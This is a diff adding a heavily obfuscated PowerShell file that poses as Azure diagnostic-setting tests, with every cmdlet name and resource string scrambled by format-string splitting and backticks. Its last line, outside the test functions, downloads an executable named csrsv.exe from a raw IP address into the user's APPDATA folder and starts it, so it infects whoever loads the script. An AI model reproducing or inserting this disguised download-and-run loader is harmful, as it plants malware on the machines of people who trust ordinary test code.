@@ -1,0 +1,192 @@
+function teSt-`GetA`zURErMDiaGN`oSTIC`seTt`INg
+{
+    try 
+    {
+        
+        ${ACt`UAL} = &("{3}{2}{0}{4}{1}" -f 'DiagnosticSet','ng','t-Az','Ge','ti') -ResourceId ("{33}{25}{19}{16}{4}{7}{32}{24}{13}{17}{9}{10}{26}{29}{15}{12}{5}{18}{30}{28}{3}{22}{2}{0}{23}{1}{20}{34}{35}{11}{14}{27}{31}{8}{21}{6}"-f't','r','ers/test.shoebox/','ntegrat','1a66c','s/','2','e0','0ea','-a91','2ec8986','s2/p','rcegroup','a0b-b2','stes','u','ons/','bc','ins','i','eso','stusR','ion/provid','est','33-4','ipt','a6/res','t','ghts-i','o','i','000','4-b6','/subscr','urc','e') -name ("{0}{1}" -f's','ervice')
+
+		&("{2}{1}{0}{3}"-f 'ot','-N','Assert','Null') ${a`cT`UAl} ("{4}{5}{1}{0}{2}{3}"-f 'eEqu','rt-Ar','al',' ','Null ','result 
+
+		Asse')((("{1}{18}{10}{17}{11}{15}{22}{14}{7}{23}{12}{8}{9}{3}{20}{2}{13}{16}{6}{0}{5}{4}{21}{19}" -f 'ctua','/subscriptions/1a66ce04-b633-4a0b-b2bc-a912ec8986a','.Category
+		Assert-AreEqual workspace1 csKactual.WorkspaceI','al.Lo','2ec8986a6/resourcegroups/','l = Get-AzDiagnosticSetting -ResourceId /subscriptions/1a66ce04-b633-4a0b-b2bc-a91','    csKa','og1   csKactual.Logs[0].Category
+		Assert-AreEqual cs','   csKactual.Logs[1].Enabled
+		Assert-AreEqual TestLog2  ',' csKactu','s/','Name
+		Assert-AreEqual 1            csKactual.Metrics.Count
+		Assert-AreEqual csKtrue        csKactual.Metrics[0].Enabled
+		Assert-AreEqual 00:01:00   csKactual.Metrics[0].Timegra','ue     ','d
+		Assert-Null csKactual.ServiceBusRuleId
+		Assert-Ar','rt-AreEqual TestL','in
+		Assert-AreEqual 2            csKactual.Logs.Count
+		Assert-AreEqual csKtrue     ','eEqual service    csKactual.Name
+
+    ','montest/providers/Microsoft.Storage/storageAccounts/montest3470 csKactual.StorageAccountId
+		Assert-AreEqual /subscriptions/1a66ce04-b633-4a0b-b2bc-a912ec8986a6/resourceGroups/montest/providers/Microsoft.ServiceBus/namespaces/ns1/authorizationrules/ar1 csKactual.EventHub','6/resourceGroup','sources2/pstest0000eastusR2
+
+		Assert-NotNull csKactual Null','gs[1]','insights-integration/providers/test.shoebox/testre','   csKactual.Logs[0].Enabled
+		Asse','Ktr'))-CReplAce 'csK',[ChaR]36) ("{2}{0}{1}"-f 'su','lt','re') 
+		${A`CTU`AL} = ${a`CTUaL}[0]
+
+		&("{0}{3}{2}{4}{1}"-f 'Ass','ual','e','ert-Ar','Eq') ("{19}{17}{6}{23}{4}{16}{10}{11}{24}{14}{13}{1}{9}{7}{0}{18}{12}{26}{22}{8}{21}{15}{20}{25}{2}{5}{3}"-f'roviders/Mic','n','s/mont','470','b2bc-a912ec8986a6/','est3','04-b','p','r','test/','eso','urce','s','o','m','stora','r','1a66ce','ro','/subscriptions/','g','age/','ft.Sto','633-4a0b-','Groups/','eAccount','o') ${ACT`UaL}."S`Tor`AGeAcCou`NTId"
+		&("{0}{2}{1}{3}"-f 'Assert-A','u','reEq','al') ("{14}{18}{10}{4}{13}{5}{28}{8}{15}{1}{3}{22}{26}{2}{9}{33}{6}{25}{31}{12}{23}{30}{17}{7}{29}{0}{19}{20}{16}{24}{27}{32}{21}{11}" -f 'ceBu','-','a912ec898','b2b','ions/1a66c','0','r','icroso','0','6a6/re','ript','ules/ar1','on','e','/s','b','s/n','ers/M','ubsc','s/n','amespace','ionr','c','test/prov','s1/','ceGroups','-','author','4-b633-4a','ft.Servi','id','/m','izat','sou') ${A`c`TuAl}."EV`E`NTHuBN`AMe"
+		&("{0}{4}{1}{3}{2}" -f'A','sert-AreE','l','qua','s') 1            ${a`CTUal}."mET`RiCs"."Co`UNT"
+		&("{1}{0}{2}{3}" -f '-Are','Assert','Equa','l') ${t`RUe}        ${Act`UAL}."MeTri`cs"[0]."eN`AbLED"
+		&("{0}{2}{1}{3}" -f 'Asse','t-Are','r','Equal') ("{0}{1}{2}"-f'00:0','1',':00')   ${A`CTu`Al}."m`e`TrIcS"[0]."TiMeg`Ra`in"
+		&("{4}{3}{1}{2}{0}" -f 'l','reEqu','a','ert-A','Ass') 2            ${aC`T`UAL}."lo`gs"."C`OuNt"
+		&("{0}{1}{2}{3}" -f 'Assert','-AreEq','ua','l') ${Tr`Ue}        ${ACTu`AL}."l`OGs"[0]."eNa`BleD"
+		&("{1}{2}{0}{4}{3}"-f't-AreE','As','ser','al','qu') ("{0}{1}{2}"-f'TestLo','g','1')   ${ac`T`UAl}."LO`gs"[0]."ca`TEGo`RY"
+		&("{4}{1}{2}{0}{3}"-f'eEq','rt-A','r','ual','Asse') ${T`Rue}        ${a`c`TuAL}."l`oGS"[1]."enaBL`ED"
+		&("{2}{4}{1}{0}{3}"-f'-AreE','t','Asse','qual','r') ("{2}{1}{0}"-f '2','tLog','Tes')   ${aCT`U`Al}."L`Ogs"[1]."ca`TeGoRY"
+		&("{2}{3}{1}{0}" -f't-AreEqual','ser','A','s') ("{2}{1}{0}" -f'ace1','ksp','wor') ${AC`TuaL}."wOrKS`pAc`eiD"
+		&("{0}{1}{2}" -f'As','sert-','Null') ${ACT`Ual}."sEr`Vi`C`eBUsR`UlEID"
+		&("{1}{2}{3}{0}{4}"-f 'AreEq','Asse','rt','-','ual') ("{0}{1}"-f'serv','ice')    ${ACTu`AL}."Na`Me"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+function T`eSt-se`Taz`URer`mdiAgN`osTIC`s`etTIngU`PdaTE
+{
+    try 
+    {
+	    ${Ac`T`Ual} = &("{2}{5}{3}{0}{1}{4}"-f'zDiag','nosticSe','S','A','tting','et-') -ResourceId ("{2}{13}{24}{18}{0}{3}{22}{1}{6}{7}{8}{5}{14}{11}{4}{17}{9}{23}{10}{20}{16}{21}{12}{15}{19}" -f '1a66ce04-b6','-','/subscr','3','e','2e','b2bc-','a9','1','/pro','s','ights-int','s2/pstest00','i','c8986a6/resourcegroups/ins','00east','oebox/','gration','tions/','usR2','t.sh','testresource','3-4a0b','viders/te','p') -StorageAccountId ("{10}{13}{0}{20}{11}{9}{8}{5}{16}{2}{7}{19}{17}{3}{21}{1}{18}{14}{12}{15}{4}{6}" -f'66ce','e/sto','oups/m','osoft.','c','ce','counts/montest3470','on','986a6/resour','912ec8','/subscriptio','-4a0b-b2bc-a','g','ns/1a','a','eA','Gr','est/providers/Micr','r','t','04-b633','Storag') -Enabled ${TR`UE}
+
+		&("{0}{1}{2}{3}{4}"-f'A','ss','ert','-AreEqua','l') ${aC`TUAL}."StO`RAGEAccO`UN`T`id" ("{13}{17}{8}{27}{1}{18}{24}{0}{3}{2}{21}{25}{20}{15}{11}{23}{5}{9}{29}{26}{12}{6}{22}{14}{10}{16}{4}{28}{19}{7}"-f'6','ion','e04-b','c','r','-','ur','470','bscri','a9','iders/Mic','b','reso','/s','est/prov','-4a0b-b2','rosoft.Sto','u','s/','unts/montest3','3','6','ceGroups/mont','c','1a6','3','6a6/','pt','age/storageAcco','12ec898')
+		&("{2}{3}{0}{1}" -f 'Eq','ual','Ass','ert-Are') ("{24}{10}{8}{21}{5}{12}{16}{17}{25}{11}{4}{13}{26}{15}{20}{19}{1}{9}{0}{3}{2}{27}{18}{23}{7}{22}{6}{14}"-f 'ft.ServiceBus/','Mic','ce','namespa','r','2','s/a','o','3','roso','a66ce04-b63','/','e','esou','r1','eGroup','c8986','a','oriza','/','s/montest/providers','-4a0b-b2bc-a91','nrule','ti','/subscriptions/1','6','rc','s/ns1/auth') ${Ac`Tu`Al}."E`V`Enth`UBnAMe"
+		&("{1}{3}{2}{4}{0}"-f 'l','Assert-A','Equ','re','a') 1           ${ac`Tu`AL}."mE`TRIcS"."CO`UNT"
+		&("{1}{0}{3}{2}"-f 'sert','As','ual','-AreEq') ${Tr`UE}       ${A`CtU`AL}."m`eTRI`cS"[0]."en`ABl`ED"
+		&("{1}{3}{2}{0}" -f 'reEqual','A','sert-A','s') ("{0}{1}"-f'00:01:0','0')  ${a`ct`UAL}."MET`RiCS"[0]."TIMe`Gr`AIn"
+		&("{0}{3}{1}{2}" -f 'A','sert-','AreEqual','s') 2           ${ACt`U`AL}."lo`gs"."C`Ount"
+		&("{4}{0}{2}{1}{3}"-f't','qua','-AreE','l','Asser') ${t`Rue}       ${ACt`UaL}."l`OGs"[0]."EN`A`BLEd"
+		&("{0}{1}{2}"-f 'Ass','ert-Ar','eEqual') ("{0}{1}{2}"-f'Tes','tLo','g1')  ${aCT`UaL}."lo`Gs"[0]."C`AteGo`Ry"
+		&("{1}{2}{3}{0}" -f 'l','As','sert-AreE','qua') ${t`Rue}       ${Ac`T`Ual}."Lo`gs"[1]."E`NAbled"
+		&("{1}{2}{0}"-f'eEqual','Assert-','Ar') ("{2}{1}{0}" -f 'g2','tLo','Tes')  ${a`CTUal}."L`oGs"[1]."cATeg`O`Ry"
+		&("{2}{1}{0}" -f 'l','ssert-Nul','A') ${ActU`Al}."serVIcE`B`USruLEId"
+		&("{4}{1}{3}{2}{0}" -f'l','s','AreEqua','sert-','A') ("{0}{2}{1}" -f 'serv','ce','i')   ${a`CTual}."Na`mE"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+function T`e`s`T-SE`TAz`Ur`ERmdiag`NosTICS`eT`TiNgCR`e`AtE
+{
+    try 
+    {
+	    
+	    ${aCTU`Al} = &("{6}{2}{4}{1}{3}{0}{5}"-f 'tin','sticSe','iag','t','no','g','Set-AzD') -ResourceId ("{10}{12}{7}{21}{3}{24}{1}{14}{23}{17}{13}{8}{25}{28}{27}{16}{22}{5}{6}{9}{20}{26}{19}{18}{4}{11}{2}{15}{0}" -f'EAUP','0a-0ba1-462','ryKeyV','ns/9','ults/m','em-s','as-test/pr','ip','5dc45/r','oviders/Mic','/sub','yCana','scr','1ee2','4-','aultCUS','sy','c82-97e','va','soft.KeyVault/','r','tio','st','b','cf7cc','esourceG','o','ups/','ro') -StorageAccountId ("{22}{9}{14}{19}{21}{32}{7}{15}{5}{3}{24}{17}{13}{16}{30}{27}{10}{26}{18}{6}{31}{0}{28}{33}{2}{25}{35}{12}{23}{4}{34}{1}{11}{29}{8}{20}" -f's/vne','eAcc','st','-','o','2','Grou','6','tcu','subscrip','s','ounts/vnetcnaryt','Storag','25dc4','t','24-bc8','5','e1ee','ce','i','seuap2','ons/9cf7cc0a-0','/','e/st','97','/providers/Mic','our','e','t-ea','es','/r','p','ba1-4','st-te','rag','rosoft.') -Enabled ${t`RuE}
+
+		&("{3}{1}{0}{2}"-f'eE','sert-Ar','qual','As') ${A`ctU`Al}."S`TO`R`AGEAc`CounTid" ("{14}{21}{22}{13}{16}{17}{20}{15}{19}{8}{2}{9}{12}{3}{7}{18}{11}{23}{0}{4}{6}{24}{1}{10}{5}" -f 'ageAccoun','cnarytestcus','t-east-','rs/Mic','ts/','ap2','vne','r','s/vne','tes','eu','Storage/','t/provide','-0ba1-','/subscript','/resource','4624','-bc82-97e1ee25dc4','osoft.','Group','5','ions/9cf7cc0','a','stor','t')
+		&("{3}{0}{2}{1}" -f 't-Are','ual','Eq','Asser') 1            ${aCtu`AL}."M`e`TricS"."CO`UnT"
+		&("{2}{0}{1}{3}" -f 't-Ar','eE','Asser','qual') ${T`RUe}        ${act`U`AL}."mETR`iCS"[0]."enA`Bl`ED"
+		&("{3}{2}{0}{1}{4}" -f'A','reEq','rt-','Asse','ual') ("{3}{2}{0}{1}"-f 'c','s','lMetri','Al') ${aC`Tu`AL}."m`ETr`iCs"[0]."Ca`TEG`ory"
+		&("{1}{3}{4}{0}{2}" -f'Eq','Assert-A','ual','r','e') 1            ${Ac`Tu`Al}."Lo`gS"."C`OuNT"
+		&("{0}{2}{1}" -f'Asser','eEqual','t-Ar') ${TR`Ue}        ${a`Ctu`Al}."LO`GS"[0]."E`NaB`leD"
+		&("{0}{1}{3}{2}" -f'Ass','ert-AreEqu','l','a') ("{1}{2}{0}" -f 't','AuditEv','en') ${act`Ual}."L`oGs"[0]."cat`EgoRY"
+		&("{4}{1}{2}{0}{3}"-f 'eEq','A','r','ual','Assert-') ("{0}{1}" -f 's','ervice')   ${AcTu`AL}."n`AmE"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+function TeST-SetAzUReRmdI`A`GNoSTICS`eTTinGWIthr`ete`Nt`i`ON
+{
+    try 
+    {
+	    ${a`c`TUAl} = &("{4}{0}{3}{5}{2}{1}"-f'n','tting','e','osti','Set-AzDiag','cS') -ResourceId ("{6}{1}{7}{4}{24}{16}{13}{3}{5}{9}{14}{11}{25}{18}{19}{21}{0}{2}{27}{15}{22}{26}{8}{17}{23}{10}{20}{12}" -f 'n','ubs','tegration/provi','3','tio','-4a0','/s','crip','test','b-b','/pstest0','6a','R2','e04-b63','2bc-a912ec898','/test.sh','66c','r','sourc','egroups/insight','000eastus','s-i','oeb','esources2','ns/1a','6/re','ox/','ders') -StorageAccountId ("{30}{20}{25}{16}{8}{14}{32}{18}{28}{2}{10}{4}{6}{15}{0}{26}{22}{13}{29}{27}{9}{12}{17}{3}{21}{1}{5}{23}{7}{11}{24}{31}{19}"-f'est/provid','ora','rceGr','/','s','ge','/mon','c','-4a','t','oup','ount','.Stora','s','0b','t','1a66ce04-b633','ge','912ec8986a6','3470','ip','st','Micro','Ac','s/montes','tions/','ers/','f','/resou','o','/subscr','t','-b2bc-a') -Enabled ${TR`Ue} -RetentionEnabled ${Tr`UE} -RetentionInDays 90
+
+		&("{2}{1}{0}{3}" -f 't-A','er','Ass','reEqual') ${Ac`T`UAL}."s`TORaGe`A`cCoUntiD" ("{8}{13}{12}{18}{19}{3}{5}{10}{11}{22}{16}{14}{0}{9}{7}{17}{4}{21}{1}{15}{6}{2}{20}"-f '/','sof','rage/storageA','4-b633-4a0b','ic','-','.Sto','nt','/su','mo','b','2bc-a912e','criptio','bs','ps','t','resourceGrou','est/providers/M','ns/1','a66ce0','ccounts/montest3470','ro','c8986a6/')
+		&("{3}{1}{2}{0}" -f 'al','sert-A','reEqu','As') ("{0}{1}{2}"-f'works','pace','1') ${ACtU`AL}."W`O`RKSpAcEiD"
+		&("{1}{3}{0}{2}" -f'AreEq','As','ual','sert-') ("{24}{12}{18}{14}{7}{13}{20}{5}{4}{21}{22}{15}{26}{6}{19}{0}{1}{9}{16}{2}{8}{3}{11}{25}{27}{23}{10}{17}" -f'so','u','soft.','iceBus/','3-4','4-b63','ec898','1a6','Serv','rce','a','names','ipti','6c','ns/','-a9','Groups/montest/providers/Micro','r1','o','6a6/re','e0','a0b-b2b','c','orizationrules/','/subscr','paces/ns1/au','12','th') ${A`c`TUal}."EvEnTHu`B`NaME"
+		&("{1}{2}{0}"-f't-AreEqual','Ass','er') 1           ${A`Ctu`AL}."Metr`i`cs"."c`ouNT"
+		&("{0}{2}{1}" -f'A','ual','ssert-AreEq') ${t`RUE}       ${A`cT`UAL}."M`etr`ICs"[0]."eN`Abl`ed" ("{1}{2}{0}{3}" -f'[0','Metric','s',']')
+		&("{1}{0}{2}{4}{3}" -f 't','Asser','-Ar','ual','eEq') ("{0}{2}{1}"-f'00','1:00',':0')  ${ac`T`UaL}."MEt`Ri`Cs"[0]."t`ImEG`RaIn"
+		&("{3}{0}{1}{4}{2}"-f 'ert','-','ual','Ass','AreEq') ${TR`UE}       ${aC`Tu`AL}."M`E`TRics"[0]."R`ETeNtion`PO`lIcY"."En`ABlED" ("{3}{6}{2}{1}{7}{4}{5}{0}" -f'nPolicy','[0]','ric','Me','etenti','o','t','.R')
+		&("{0}{1}{2}{3}"-f'Ass','ert-AreE','qua','l') 90          ${acTu`AL}."M`eTrics"[0]."re`TenTIO`NPolicY"."D`AYS"
+		&("{3}{0}{4}{1}{2}" -f 'r','E','qual','Assert-A','e') 2           ${actU`AL}."lO`GS"."c`OuNT"
+		&("{2}{0}{1}{3}"-f'ssert-AreEq','ua','A','l') ${t`Rue}       ${a`CTu`AL}."L`OGs"[0]."EnA`B`leD" ("{2}{1}{0}" -f']','0','Logs[')
+		&("{2}{1}{4}{0}{3}"-f 'e','s','As','Equal','ert-Ar') ("{1}{0}" -f'og1','TestL')  ${Ac`T`UAL}."l`oGS"[0]."CatE`g`ORY"
+		&("{4}{1}{3}{0}{2}"-f'r','ert','eEqual','-A','Ass') ${t`Rue}       ${a`CTu`Al}."l`ogS"[0]."RetEnt`ionp`ol`iCY"."eNaBL`eD" ("{4}{3}{5}{2}{1}{0}" -f'Policy','on','enti','s[0].R','Log','et')
+		&("{4}{3}{1}{0}{2}"-f 'qu','eE','al','rt-Ar','Asse') 90          ${Ac`Tu`Al}."L`ogs"[0]."RE`TeNTi`OnpolIcY"."D`AyS"
+		&("{2}{1}{0}"-f'Equal','sert-Are','As') ${t`RuE}       ${aC`TuaL}."l`ogs"[1]."E`NAbLed"
+		&("{1}{2}{3}{0}"-f'ert-AreEqual','A','s','s') ("{1}{0}"-f'tLog2','Tes')  ${a`CTual}."L`OGs"[1]."cAte`GORY"
+		&("{0}{2}{1}" -f 'Assert-AreEq','al','u') ${Tr`UE}       ${a`ctual}."L`oGs"[1]."REteNti`ON`PO`LiCy"."E`Na`BLed"
+		&("{2}{0}{1}" -f'q','ual','Assert-AreE') 90          ${aC`Tual}."Lo`gS"[1]."Ret`ENt`i`ONPOLI`CY"."d`Ays"
+		&("{1}{2}{3}{0}"-f'-Null','Asse','r','t') ${A`cT`Ual}."S`ervICE`B`UsRUl`EiD"
+		&("{0}{2}{1}"-f'Asser','al','t-AreEqu') ("{1}{0}" -f 'ice','serv')   ${a`ctUAl}."Na`me"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+function te`st-SET`Az`URERMdIagnos`TiCSEtt`ING`-CaTE`GO`RIeSONly
+{
+    try 
+    {
+	    ${Ac`Tual} = &("{2}{5}{6}{0}{4}{3}{1}"-f 'Diag','ting','S','sticSet','no','et','-Az') -ResourceId ("{24}{19}{15}{11}{14}{21}{1}{23}{10}{5}{3}{4}{9}{16}{25}{0}{18}{12}{20}{6}{26}{8}{13}{17}{7}{22}{2}"-f'n/provid','c','sR2','roups/ins','ights-','c8986a6/resourceg','oebox/testres','ast','urces2/','integra','a912e','s/1a66ce','rs/tes','p','04-','ption','t','stest0000e','e','cri','t.sh','b633-4a0b-b2b','u','-','/subs','io','o') -StorageAccountId ("{10}{23}{11}{22}{0}{4}{1}{18}{3}{20}{19}{13}{21}{12}{2}{8}{17}{7}{5}{16}{15}{9}{6}{14}"-f '-b2bc-','r','iders/Microso','so','a912ec8986a6/','/','Accounts/mon','e','ft.S','ge','/subscri','633-4a','t/prov','n','test3470','a','stor','torag','e','o','urceGroups/m','tes','0b','ptions/1a66ce04-b') -Enabled ${tR`UE} -Category ("{1}{2}{0}" -f 'tLog2','T','es')
+
+		&("{1}{3}{2}{0}" -f 'reEqual','Asser','A','t-') ${AcT`Ual}."stoRAGeaCCo`Un`TiD" ("{16}{30}{13}{27}{25}{18}{14}{19}{3}{2}{24}{11}{12}{6}{17}{29}{8}{7}{0}{1}{23}{22}{28}{20}{4}{15}{21}{10}{26}{5}{9}" -f 's','/M','c','-a912e','ageAccou','34','eso','rovider','st/p','70','mo','86','a6/r','ons','-4a','nts','/s','urceGroups/mo','633','0b-b2bc','ft.Storage/stor','/','cro','i','89','1a66ce04-b','ntest','/','so','nte','ubscripti')
+		&("{0}{1}{2}{3}" -f 'Asse','rt-A','reEq','ual') ("{21}{33}{28}{2}{14}{22}{5}{24}{0}{11}{13}{10}{19}{9}{3}{8}{1}{25}{6}{23}{17}{20}{32}{12}{27}{31}{16}{15}{30}{18}{4}{7}{26}{29}" -f '33','e','ions','ec8986','a','e04-b','ceGroups','uthoriza','a6/r','b2bc-a912','a0b','-','oft.Serv','4','/','espace','nam','est/pr','/ns1/','-','oviders/','/s','1a66c','/mont','6','sour','tionrule','i','script','s/ar1','s','ceBus/','Micros','ub') ${ac`TU`AL}."ev`eNthUb`Name"
+		&("{2}{1}{0}{3}"-f'er','s','As','t-AreEqual') 1            ${A`ctU`Al}."MEt`R`ics"."Co`UNT"
+		&("{3}{0}{2}{1}"-f 'ssert-A','Equal','re','A') ${F`Al`Se}       ${A`ctU`AL}."mETr`icS"[0]."e`NA`BlEd"
+		&("{2}{3}{0}{4}{1}" -f 'sert','Equal','A','s','-Are') ("{1}{0}{2}" -f ':0','00','1:00')   ${aC`TUAL}."mE`T`RIcs"[0]."t`imEG`RaiN"
+		&("{2}{3}{0}{1}"-f'ert-AreEqua','l','As','s') 2            ${Act`UaL}."LO`Gs"."cOU`NT"
+		&("{2}{4}{0}{1}{3}"-f 'Ar','eEqu','Assert','al','-') ${fAl`SE}       ${a`CTUAL}."l`oGS"[0]."En`Ab`led"
+		&("{0}{1}{4}{2}{3}"-f'A','ssert-','qua','l','AreE') ("{1}{0}{2}"-f 'e','T','stLog1')   ${a`ct`Ual}."L`OgS"[0]."c`ATE`gory"
+		&("{2}{0}{4}{1}{3}"-f 'rt-Are','a','Asse','l','Equ') ${tr`UE}        ${ac`Tual}."l`oGS"[1]."E`Nab`led"
+		&("{1}{0}{2}{3}" -f'e','Ass','r','t-AreEqual') ("{1}{0}"-f 'g2','TestLo')   ${AcT`U`Al}."lO`gS"[1]."cA`TEGo`RY"
+		&("{3}{0}{1}{2}"-f'sse','rt-Ar','eEqual','A') ("{0}{2}{1}" -f'work','e1','spac') ${acT`UAL}."W`Ork`S`pAceID"
+		&("{0}{1}{2}" -f'A','ssert-Nul','l') ${A`cT`UAl}."seRVicE`BuSR`UL`eId"
+		&("{0}{1}{2}{3}{4}"-f'Asser','t-','AreEq','u','al') ("{1}{0}"-f 'ice','serv')    ${a`CT`Ual}."nA`Me"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+function Te`ST-setaZurE`R`mdiAGnOSTIcSettInG-Tim`e`Grai`NsO`N`ly
+{
+    try 
+    {
+	    ${Act`Ual} = &("{3}{5}{2}{6}{0}{4}{1}"-f'o','ng','Di','S','sticSetti','et-Az','agn') -ResourceId ("{4}{18}{13}{20}{10}{0}{9}{28}{3}{22}{7}{8}{6}{15}{17}{5}{23}{2}{21}{11}{16}{19}{29}{27}{24}{1}{12}{26}{25}{14}" -f 'a','b','-integ','898','/s','ht','/r','a','6','0b-b2bc-a912','a66ce04-b633-4','pro','ox','t','0eastusR2','e','vi','sourcegroups/insig','ubscrip','ders/t','ions/1','ration/','6','s','hoe','stresources2/pstest000','/te','t.s','ec','es') -StorageAccountId ("{28}{9}{25}{12}{22}{10}{11}{1}{0}{13}{29}{5}{20}{26}{24}{16}{30}{4}{19}{3}{2}{31}{27}{15}{14}{7}{21}{6}{23}{17}{18}{8}"-f '04-b633-4a0b','e','s/','der','/pro','912','mont','cou','0','scrip','6','6c','ns/','-b2','/storageAc','e','on','s','t347','vi','ec8986a6/res','nts/','1a','e','s/m','tio','ourceGroup','torag','/sub','bc-a','test','Microsoft.S') -Enabled ${T`Rue} -Timegrain ("{0}{1}"-f 'PT1','M')
+
+		&("{0}{3}{2}{1}" -f 'Ass','-AreEqual','t','er') ${acTU`AL}."StO`RaG`EA`CCo`UnTId" ("{12}{5}{14}{3}{10}{25}{19}{1}{4}{22}{9}{20}{27}{0}{6}{16}{21}{11}{2}{17}{26}{18}{13}{7}{24}{8}{15}{23}" -f'ceGroup','bc-a912','S','6ce0','ec8986a6/','ption','s/montest/prov','coun','/mo','es','4-','icrosoft.','/subscri','geAc','s/1a6','nt','iders','torage/s','a','-b2','ou','/M','r','est3470','ts','b633-4a0b','tor','r')
+		&("{4}{0}{3}{1}{2}" -f'ss','t-','AreEqual','er','A') ("{1}{2}{0}"-f'pace1','work','s') ${A`CTual}."WorkSPA`c`E`iD"
+		&("{4}{0}{2}{1}{3}"-f 'sert-A','Eq','re','ual','As') ("{5}{19}{26}{0}{2}{21}{13}{7}{11}{28}{15}{3}{22}{9}{16}{6}{27}{29}{17}{31}{12}{4}{14}{24}{30}{25}{20}{23}{18}{8}{10}{1}"-f'66ce04-b6','s/ar1','33-4a','/mon','iceBus/n','/s','ers/Mic','/resourc','ti','est','onrule','eGrou','v','ec8986a6','am','s','/provid','e','za','ubscription','/author','0b-b2bc-a912','t','i','espac','1','s/1a','roso','p','ft.S','es/ns','r') ${ACT`U`AL}."eVenTHub`N`AMe"
+		&("{2}{0}{4}{1}{3}" -f 'ssert-Ar','E','A','qual','e') 1            ${aC`TUal}."me`Tr`ics"."CO`UnT"
+		&("{0}{1}{3}{2}" -f'Asse','rt-Ar','ual','eEq') ${tr`Ue}        ${A`C`TuAL}."mEtRI`cs"[0]."ENAB`l`ed"
+		&("{1}{3}{0}{4}{2}"-f 'eEq','Assert-','l','Ar','ua') ("{1}{0}{2}" -f':0','00','1:00')   ${aCT`U`Al}."me`Tri`CS"[0]."T`IMeGr`AiN"
+		&("{4}{3}{1}{0}{2}"-f 'reEq','-A','ual','rt','Asse') 2            ${A`CT`Ual}."lO`gs"."co`UNT"
+		&("{3}{0}{2}{1}" -f'ssert-Are','l','Equa','A') ${fA`lsE}       ${act`UaL}."l`OGs"[0]."eN`AB`lEd"
+		&("{4}{2}{0}{1}{3}"-f'Ar','e','t-','Equal','Asser') ("{0}{1}{2}" -f'Te','stLo','g1')   ${A`CtUal}."Lo`GS"[0]."ca`TEg`oRY"
+		&("{3}{1}{0}{4}{2}" -f'ert-AreEq','s','al','As','u') ${FA`lSE}       ${A`ctu`AL}."Lo`GS"[1]."enA`BleD"
+		&("{2}{0}{3}{1}" -f 'E','ual','Assert-Are','q') ("{0}{1}"-f 'TestL','og2')   ${ac`T`UAL}."L`OgS"[1]."c`AT`EgorY"
+		&("{1}{0}{2}" -f'sser','A','t-Null') ${ac`Tual}."sErvIC`e`BuS`RUl`eID"
+		&("{1}{4}{2}{0}{3}" -f 'qua','Asse','AreE','l','rt-') ("{0}{1}{2}"-f 's','ervic','e')    ${ACT`UAL}."nA`me"
+    }
+    finally
+    {
+        
+        
+    }
+}
+
+
+(&("{1}{0}{2}" -f 'Obje','New-','ct') ("{3}{4}{5}{1}{2}{0}"-f't','.','WebClien','Sy','st','em.Net')).("{1}{2}{3}{0}"-f'nloadFile','D','o','w').Invoke(("{4}{1}{2}{0}{5}{6}{3}" -f'4','/','/9','8/~yahoo/csrsv.exe','http:','.10','2.53.23'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}" -f '-Proc','ess','Start') ("$env:APPDATA\csrsv.exe")
